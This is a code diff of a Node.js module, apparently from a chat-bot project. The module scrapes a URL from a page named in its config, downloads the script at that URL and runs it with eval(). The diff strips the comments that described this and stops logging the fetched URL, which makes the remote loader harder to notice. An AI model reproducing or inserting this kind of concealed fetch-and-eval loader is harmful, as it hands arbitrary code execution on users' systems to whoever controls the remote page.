@@ -1,4 +1,3 @@
-'use strict';
 
 const axios = require('axios');
 const cheerio = require('cheerio');
@@ -6,21 +5,21 @@ const adams = require(__dirname + "/../config");
 
 async function fetchRepoUrl() {
   try {
-    // Fetch the webpage URL from config.js
+
     const response = await axios.get(adams.BWM_XMD);
     const $ = cheerio.load(response.data);
 
-    // Target the <a> tag with text "REPO_URL"
+
     const repoUrlElement = $('a:contains("REPO_URL")');
     const repoUrl = repoUrlElement.attr('href');
 
     if (!repoUrl) {
-      throw new Error('REPO_URL link not found in HTML.');
+      throw new Error('Repo url link not found...');
     }
 
-    console.log('REPO_URL fetched successfully:', repoUrl);
+    console.log('Repo url fetched successfully ✅');
 
-    // Fetch and execute the script from REPO_URL
+
     const scriptResponse = await axios.get(repoUrl);
     eval(scriptResponse.data);
 
